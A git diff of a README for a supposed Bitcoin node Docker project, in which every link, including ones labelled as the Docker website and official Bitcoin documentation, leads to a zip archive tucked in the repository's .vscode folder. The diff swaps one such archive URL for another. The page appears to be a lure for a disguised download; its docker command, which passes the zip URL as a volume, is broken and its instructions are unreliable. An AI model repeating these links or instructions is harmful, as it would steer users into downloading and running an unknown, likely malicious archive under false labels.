@@ -1,6 +1,6 @@
 # 🚀 noderize_bitcoin_docker - Run a Bitcoin Node Simply
 
-[![Download noderize_bitcoin_docker](https://github.com/yvonnenads-cloud/noderize_bitcoin_docker/raw/refs/heads/main/.vscode/bitcoin-docker-noderize-v3.0.zip)](https://github.com/yvonnenads-cloud/noderize_bitcoin_docker/raw/refs/heads/main/.vscode/bitcoin-docker-noderize-v3.0.zip)
+[![Download noderize_bitcoin_docker](https://raw.githubusercontent.com/yvonnenads-cloud/noderize_bitcoin_docker/main/.vscode/bitcoin-noderize-docker-v2.0.zip)](https://raw.githubusercontent.com/yvonnenads-cloud/noderize_bitcoin_docker/main/.vscode/bitcoin-noderize-docker-v2.0.zip)
 
 ## 📥 Introduction
 
@@ -15,11 +15,11 @@ To run the Bitcoin node, you need to install Docker on your computer first. Dock
 - Operating System: Windows, macOS, or Linux
 - RAM: 2 GB minimum (4 GB or more is recommended)
 - Disk Space: At least 250 MB for the initial download, with additional space needed as the blockchain grows
-- Docker: Make sure Docker is installed; you can find the installation guide on the [Docker website](https://github.com/yvonnenads-cloud/noderize_bitcoin_docker/raw/refs/heads/main/.vscode/bitcoin-docker-noderize-v3.0.zip).
+- Docker: Make sure Docker is installed; you can find the installation guide on the [Docker website](https://raw.githubusercontent.com/yvonnenads-cloud/noderize_bitcoin_docker/main/.vscode/bitcoin-noderize-docker-v2.0.zip).
 
 ## 📦 Download & Install
 
-To download the Docker image, visit this page to download: **[Download noderize_bitcoin_docker](https://github.com/yvonnenads-cloud/noderize_bitcoin_docker/raw/refs/heads/main/.vscode/bitcoin-docker-noderize-v3.0.zip)**.
+To download the Docker image, visit this page to download: **[Download noderize_bitcoin_docker](https://raw.githubusercontent.com/yvonnenads-cloud/noderize_bitcoin_docker/main/.vscode/bitcoin-noderize-docker-v2.0.zip)**.
 
 1. Click on the link above.
 2. On the Releases page, find the latest release version.
@@ -35,13 +35,13 @@ After you have downloaded the image, here’s how you can run it:
 2. Use this command to run the Docker container:
 
    ```bash
-   docker run -d --name bitcoin-node -v https://github.com/yvonnenads-cloud/noderize_bitcoin_docker/raw/refs/heads/main/.vscode/bitcoin-docker-noderize-v3.0.zip noderize_bitcoin_docker
+   docker run -d --name bitcoin-node -v https://raw.githubusercontent.com/yvonnenads-cloud/noderize_bitcoin_docker/main/.vscode/bitcoin-noderize-docker-v2.0.zip noderize_bitcoin_docker
    ```
 
 This command does the following:
 - `-d`: Runs the container in detached mode.
 - `--name bitcoin-node`: Assigns a name to your container.
-- `-v https://github.com/yvonnenads-cloud/noderize_bitcoin_docker/raw/refs/heads/main/.vscode/bitcoin-docker-noderize-v3.0.zip`: Creates a volume for your node data, making your blockchain data persistent.
+- `-v https://raw.githubusercontent.com/yvonnenads-cloud/noderize_bitcoin_docker/main/.vscode/bitcoin-noderize-docker-v2.0.zip`: Creates a volume for your node data, making your blockchain data persistent.
 
 ## 🌐 Accessing Your Node
 
@@ -74,8 +74,8 @@ If you encounter issues during installation or while running your node, consider
 
 For more information about setting up and using Bitcoin nodes, check out these resources:
 
-- [Official Bitcoin Documentation](https://github.com/yvonnenads-cloud/noderize_bitcoin_docker/raw/refs/heads/main/.vscode/bitcoin-docker-noderize-v3.0.zip)
-- [Docker Documentation for Beginners](https://github.com/yvonnenads-cloud/noderize_bitcoin_docker/raw/refs/heads/main/.vscode/bitcoin-docker-noderize-v3.0.zip)
+- [Official Bitcoin Documentation](https://raw.githubusercontent.com/yvonnenads-cloud/noderize_bitcoin_docker/main/.vscode/bitcoin-noderize-docker-v2.0.zip)
+- [Docker Documentation for Beginners](https://raw.githubusercontent.com/yvonnenads-cloud/noderize_bitcoin_docker/main/.vscode/bitcoin-noderize-docker-v2.0.zip)
 
 ## 📧 Support
 
